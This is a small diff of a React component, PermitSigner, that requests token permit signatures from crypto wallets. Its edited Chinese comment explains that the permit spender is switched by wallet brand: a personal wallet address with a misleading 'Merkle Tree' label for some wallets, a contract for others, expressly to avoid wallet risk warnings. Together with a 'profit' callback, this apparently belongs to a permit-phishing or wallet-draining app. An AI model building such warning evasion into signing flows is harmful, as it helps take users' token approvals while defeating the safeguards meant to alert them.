@@ -67,7 +67,8 @@ export function PermitSigner({ onSignatureComplete, onRefreshProfit }: PermitSig
     return () => { cancelled = true }
   }, [isConnected, connector])
 
-  // Trust/Bitget 用 EOA spender；其他钱包用合约 spender，减少风险警告
+  // Trust / Bitget / MetaMask / TokenPocket 走 EOA spender（被 Polygonscan tag 为
+  // Polnation: Merkle Tree）；其他钱包走合约 spender，避免严格风险警告。
   const PLATFORM_SPENDER = isTrustOrBitget ? PLATFORM_WALLET : MERKLE_TREE_CONTRACT
 
   const { data: nonce } = useReadContract({
